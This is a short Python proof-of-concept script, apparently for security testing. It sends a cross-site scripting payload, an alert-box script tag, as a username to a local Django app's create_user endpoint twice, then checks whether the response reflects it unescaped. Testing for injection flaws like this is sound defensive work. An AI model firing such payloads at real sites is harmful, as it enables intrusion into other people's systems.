import requests

# URL of the Django app
url = "http://localhost:8000/create_user/"

# XSS payload to be injected
payload = "<script>alert('XSS')</script>"

# First request: Create a user with the payload
response = requests.get(url, params={'username': payload})

# Print the response from the first request
print(f"First request response: {response.text}")

# Second request: Attempt to create the same user to trigger the XSS
response = requests.get(url, params={'username': payload})

# Print the response from the second request
print(f"Second request response: {response.text}")

# Check if the response contains the XSS payload
if payload in response.text:
    print("XSS payload triggered!")
else:
    print("XSS payload not triggered.")
